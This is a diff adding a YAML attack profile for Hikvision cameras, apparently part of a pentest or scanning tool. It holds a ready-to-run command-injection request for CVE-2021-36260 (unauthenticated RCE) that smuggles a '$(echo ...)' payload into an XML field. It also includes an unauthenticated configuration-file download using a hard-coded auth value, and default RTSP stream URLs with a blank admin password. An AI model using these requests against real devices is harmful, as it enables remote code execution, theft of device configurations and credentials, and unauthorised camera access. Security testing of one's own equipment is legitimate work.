@@ -1,0 +1,40 @@
+id: hikvision
+device_type: camera
+vendor: Hikvision
+family: hikvision
+requires:
+  port: 80
+actions:
+  - id: cve-2021-36260-check
+    label: "Check CVE-2021-36260 (unauth RCE)"
+    category: check_safe
+    dangerous: false
+    steps:
+      - note: "PUT /SDK/webLanguage with XML-embedded command injection; probe with `echo TEST`"
+      - http_request:
+          url: "http://{{target.ip}}/SDK/webLanguage"
+          method: PUT
+          headers:
+            Content-Type: application/xml
+          body: |
+            <?xml version="1.0" encoding="UTF-8"?>
+            <language>$(echo NETHUNTER_PROBE)</language>
+          save_as: rce_check
+          timeout: 6
+
+  - id: config-download
+    label: "Try config download (unauth in old fw)"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/System/configurationFile?auth=YWRtaW46MTEK"
+          save_as: cfg_dl
+
+  - id: rtsp-stream-url
+    label: "Print default RTSP stream URLs"
+    category: recon
+    dangerous: false
+    steps:
+      - note: "rtsp://admin:@{{target.ip}}:554/Streaming/Channels/101"
+      - note: "rtsp://admin:@{{target.ip}}:554/Streaming/Channels/102"
